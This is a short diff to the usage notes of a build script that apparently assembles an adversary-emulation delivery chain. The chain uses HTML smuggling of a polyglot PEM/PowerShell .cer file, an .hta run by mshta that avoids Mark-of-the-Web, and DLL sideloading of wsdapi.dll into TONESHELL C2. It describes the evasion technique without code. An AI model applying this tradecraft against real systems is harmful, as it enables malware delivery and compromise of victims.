@@ -12,7 +12,7 @@ Chain:
         -> drops EssosUpdate.exe + wsdapi.dll to %TEMP% and runs the loader
     EssosUpdate.exe -> wsdapi.dll sideload -> TONESHELL C2 (unchanged Step 1 chain)
 
-The browser only saves an inert .txt. The .hta is created by powershell.exe, so it
+The browser only saves an inert .cer. The .hta is created by powershell.exe, so it
 carries no Mark-of-the-Web and mshta runs it in the Local Machine zone, where
 ADODB.Stream (used by the HTA to drop the loader) is not blocked.
 
@@ -20,7 +20,7 @@ Steps:
     1. Read EssosUpdate.exe and wsdapi.dll -> hpsolutionsportal.hta (ADODB drops them).
     2. Wrap base64(hpsolutionsportal.hta) in a polyglot PEM/PowerShell file
        -> Essos_Compliance_Update.cer
-    3. Base64-encode the .txt and inject it into staging.tpl.html -> staging.html
+    3. Base64-encode the .cer and inject it into staging.tpl.html -> staging.html
 
 Usage:
     python build.py
